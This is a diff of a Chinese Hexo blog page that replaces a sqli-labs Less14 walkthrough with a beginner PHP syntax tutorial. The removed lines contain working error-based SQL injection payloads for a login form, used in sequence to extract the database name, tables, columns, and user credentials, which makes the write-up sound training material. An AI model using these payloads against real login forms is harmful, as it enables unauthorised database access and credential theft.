@@ -4,12 +4,18 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="sqli-labs Less14, Junk Blog">
-    <meta name="description" content="注入步骤
-尝试输入 username:用户名+双引号，password:随便输
+    <meta name="keywords" content="PHP 语法, Junk Blog">
+    <meta name="description" content="PHP 标记
+php 脚本可以放在文档中的任何位置。
+
+php 脚本以 &amp;lt;?php 开始， 以 ?&amp;gt; 结束。
 
 
-注：这边不太好判断出 SQL 语句，从后台可以看到 SQL 语句：SELECT username, password FROM users WHERE us">
+&amp;lt;?php
+echo &#34;hello word !&#34;;
+?&gt;
+
+php 也允许使用短标记 &amp;lt;? 和 ?&amp;">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +23,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>sqli-labs Less14 | Junk Blog</title>
+    <title>PHP 语法 | Junk Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -287,13 +293,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('http://www.developersacademy.org/blog/wp-content/uploads/2018/04/php-1024x538.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        sqli-labs Less14
+                        PHP 语法
                     </div>
                 </div>
             </div>
@@ -385,12 +391,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/sqli-labs/" target="_blank">
-                                <span class="chip bg-color">sqli-labs</span>
+                            <a href="/tags/Web/" target="_blank">
+                                <span class="chip bg-color">Web</span>
                             </a>
                         
-                            <a href="/tags/SQL-Injection/" target="_blank">
-                                <span class="chip bg-color">SQL Injection</span>
+                            <a href="/tags/php/" target="_blank">
+                                <span class="chip bg-color">php</span>
                             </a>
                         
                     </div>
@@ -401,8 +407,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Web-security/" class="post-category" target="_blank">
-                                Web security
+                            <a href="/categories/编程/" class="post-category" target="_blank">
+                                编程
                             </a>
                         
                     </div>
@@ -413,14 +419,14 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-11-01
+                    2019-11-24
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        439
+                        576
                     </div>
                     
 
@@ -443,63 +449,66 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol>
-<li><strong>尝试输入 username:用户名+双引号，password:随便输</strong></li>
-</ol>
-<p><img src="https://i.loli.net/2019/11/02/ECMurvxGokN4KWY.png" alt="less14-1.png"></p>
-<p>注：这边不太好判断出 SQL 语句，从后台可以看到 SQL 语句：SELECT username, password FROM users WHERE username=”admin” and password=”$passwd” LIMIT 0,1</p>
-<ol start="2">
-<li><strong>尝试输入 username:用户名+双引号+井号，password:随便输</strong></li>
-</ol>
-<p><img src="https://i.loli.net/2019/11/02/y28rMSVJNRQ7ZjH.png" alt="less14-2.png"></p>
-<ol start="3">
-<li><strong>猜测字段</strong></li>
-</ol>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" order by 3<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/CugEkJhG9vZBHI8.png" alt="less14-3.png"></p>
-<ol start="4">
-<li><strong>爆库</strong></li>
-</ol>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/7vPMFtYNeT8qjGi.png" alt="less14-4.png"></p>
-<ol start="5">
-<li><strong>爆表</strong></li>
-</ol>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/bqOflGDQRIVFPSH.png" alt="less14-5.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 1,1<span class="token punctuation">)</span>,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/Np1hVJqLgb2zviU.png" alt="less14-6.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 2,1<span class="token punctuation">)</span>,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/M5jdnOeWzwUA6sY.png" alt="less14-7.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 3,1<span class="token punctuation">)</span>,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/xjYwHCUQPFvWhq1.png" alt="less14-8.png"></p>
-<ol start="6">
-<li><strong>爆字段</strong></li>
-</ol>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">((</span>select column_name from information_schema.columns where table_schema<span class="token operator">=</span><span class="token string">'security'</span> AND TABLE_NAME<span class="token operator">=</span><span class="token string">'users'</span> limit 0,1<span class="token punctuation">)</span>,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/ToZEcqPgVL8aCvi.png" alt="less14-9.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">((</span>select column_name from information_schema.columns where table_schema<span class="token operator">=</span><span class="token string">'security'</span> AND TABLE_NAME<span class="token operator">=</span><span class="token string">'users'</span> limit 1,1<span class="token punctuation">)</span>,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/kS8NePXgwOT3G1v.png" alt="less14-10.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">((</span>select column_name from information_schema.columns where table_schema<span class="token operator">=</span><span class="token string">'security'</span> AND TABLE_NAME<span class="token operator">=</span><span class="token string">'users'</span> limit 2,1<span class="token punctuation">)</span>,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/dNZJ6skSQtvPzhV.png" alt="less14-11.png"></p>
-<ol start="7">
-<li><strong>爆数据</strong></li>
-</ol>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token variable"><span class="token punctuation">((</span>select username FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">))</span></span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/ykNBg7iUdcbqoTE.png" alt="less14-12.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">username：admin" union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token variable"><span class="token punctuation">((</span>select password FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">))</span></span>a from information_schema.columns group by a<span class="token comment" spellcheck="true">#</span>
-password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/11/02/JGvBxp8PtOWezg4.png" alt="less14-13.png"></p>
+                <h2 id="PHP-标记"><a href="#PHP-标记" class="headerlink" title="PHP 标记"></a>PHP 标记</h2><ul>
+<li><p>php 脚本可以放在文档中的任何位置。</p>
+</li>
+<li><p>php 脚本以 <code>&lt;?php</code> 开始， 以 <code>?&gt;</code> 结束。</p>
+</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token string">"hello word !"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>php 也允许使用短标记 <code>&lt;?</code> 和 <code>?&gt;</code> ，但是不建议使用。只有激活 php.ini 中的 <code>short_open_tag</code> 参数，php 才能使用短标记。</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>
+<span class="token keyword">echo</span> <span class="token string">"hello word !"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>如果文件内容是纯 php 代码，最好在文件末尾删除 php 结束标记。避免在 php 结束标记后不小心加入空格或换行，导致 php 输出这些空白。</li>
+</ul>
+<h2 id="PHP-注释"><a href="#PHP-注释" class="headerlink" title="PHP 注释"></a>PHP 注释</h2><p>PHP 代码中的注释不会被作为程序来读取和执行。它唯一的作用是供代码编辑者阅读。</p>
+<p><strong>注释用于：</strong></p>
+<ul>
+<li><p>使其他人理解您正在做的工作 - 注释可以让其他程序员了解您在每个步骤进行的工作（如果您供职于团队）</p>
+</li>
+<li><p>提醒自己做过什么 - 大多数程序员都曾经历过一两年后对项目进行返工，然后不得不重新考虑他们做过的事情。注释可以记录您在写代码时的思路。</p>
+</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">// 这是单行注释</span>
+
+<span class="token shell-comment comment"># 这也是单行注释</span>
+
+<span class="token comment" spellcheck="true">/*
+这是多行注释块
+它横跨了
+多行
+*/</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="PHP-大小写敏感"><a href="#PHP-大小写敏感" class="headerlink" title="PHP 大小写敏感"></a>PHP 大小写敏感</h2><p>在 PHP 中，所有用户定义的函数、类和关键词（例如 if、else、echo 等等）都对大小写不敏感。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token string">"hello world!&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">ECHO</span> <span class="token string">"hello world!&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">Echo</span> <span class="token string">"hello world!&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>不过在 PHP 中，所有变量都对大小写敏感。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$color</span><span class="token operator">=</span><span class="token string">"red"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"my car is "</span> <span class="token punctuation">.</span> <span class="token variable">$color</span> <span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"my house is "</span> <span class="token punctuation">.</span> <span class="token variable">$COLOR</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"my car is "</span> <span class="token punctuation">.</span> <span class="token variable">$Color</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="PHP-分隔符"><a href="#PHP-分隔符" class="headerlink" title="PHP 分隔符"></a>PHP 分隔符</h2><p>同 C 或 Perl 一样，PHP 需要在每个语句后用分号结束指令。一段 PHP 代码中的结束标记隐含表示了一个分号；在一个 PHP 代码段中的最后一行可以不用分号结束。如果后面还有新行，则代码段的结束标记包含了行结束。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token string">"This is a test"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+
+<span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"This is a test"</span> <span class="token delimiter">?></span>
+
+<span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">'We omitted the last closing tag'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.php.net/manual/zh/language.basic-syntax.php" target="_blank" rel="noopener">PHP 手册-基本语法</a></p>
+<p><a href="https://www.w3school.com.cn/php/php_syntax.asp" target="_blank" rel="noopener">PHP 语法</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -541,7 +550,7 @@ password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><
                     </span>
                     <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="b-link-green">Junk Blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/11/01/sqli-labs-Less14/" class="b-link-green">sqli-labs Less14</a>
+                    <a href="/2019/11/24/php语法/" class="b-link-green">PHP 语法</a>
                 </p>
             </div>
         </div>
@@ -562,53 +571,57 @@ password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/11/02/sqli-labs-Less15/">
+                <a href="/2019/11/24/php语法/">
                     <div class="card-image">
                         
+                        <img src="http://www.developersacademy.org/blog/wp-content/uploads/2018/04/php-1024x538.png" class="responsive-img" alt="PHP 语法">
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="sqli-labs Less15">
-                        
-                        <span class="card-title">sqli-labs Less15</span>
+                        <span class="card-title">PHP 语法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言正确回显是固定字符串（无回显）这里页面显示flag.jpg这张图片；
-错误回显是Mysql错误信息，这里页面显示slap.jpg这张图片。
+                    <div class="summary">PHP 标记
+php 脚本可以放在文档中的任何位置。
+
+php 脚本以 &lt;?php 开始， 以 ?&gt; 结束。
 
 
-注入步骤
-判断数据库字符串的长度
+&lt;?php
+echo "hello word !";
+?>
 
-admin' and ascii(length((sel</div>
+php 也允许使用短标记 &lt;? 和 ?&</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web-security/" class="post-category" target="_blank">
-                                    Web security
+                            <a href="/categories/编程/" class="post-category" target="_blank">
+                                    编程
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sqli-labs/" target="_blank">
-                        <span class="chip bg-color">sqli-labs</span>
+                    <a href="/tags/Web/" target="_blank">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
-                    <a href="/tags/SQL-Injection/" target="_blank">
-                        <span class="chip bg-color">SQL Injection</span>
+                    <a href="/tags/php/" target="_blank">
+                        <span class="chip bg-color">php</span>
                     </a>
                     
                 </div>
@@ -622,39 +635,27 @@ admin' and ascii(length((sel</div>
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/10/29/随堂实验-命令执行/">
+                <a href="/2019/11/24/php简介/">
                     <div class="card-image">
                         
+                        <img src="http://www.developersacademy.org/blog/wp-content/uploads/2018/04/php-1024x538.png" class="responsive-img" alt="PHP 简介">
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="随堂实验-命令执行">
-                        
-                        <span class="card-title">随堂实验-命令执行</span>
+                        <span class="card-title">PHP 简介</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">实验目标操作机：windows XP
-目标机：windows 2003
-目标地址：http://172.16.12.2
-实验目的
-学习远程命令执行的原理
-
-学习如何分析PHP远程命令执行代码
-
-学习如何利用远程命令执行漏洞
-
-
-目标：
-获取</div>
+                    <div class="summary">简介
+PHP（全称：PHP：Hypertext Preprocessor，即“ PHP：超文本预处理器 ”）是一种开源的通用计算机脚本语言，尤其适用于网络开发并可嵌入 HTML 中使用。PHP 的主要目标是允许网络开发人员快速编写动态页面，</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-29
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-24
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web-security/" class="post-category" target="_blank">
-                                    Web security
+                            <a href="/categories/编程/" class="post-category" target="_blank">
+                                    编程
                                 </a>
                             
                             
@@ -664,12 +665,12 @@ admin' and ascii(length((sel</div>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/webshell/" target="_blank">
-                        <span class="chip bg-color">webshell</span>
+                    <a href="/tags/Web/" target="_blank">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
-                    <a href="/tags/Remote-command-execution/" target="_blank">
-                        <span class="chip bg-color">Remote command execution</span>
+                    <a href="/tags/php/" target="_blank">
+                        <span class="chip bg-color">php</span>
                     </a>
                     
                 </div>
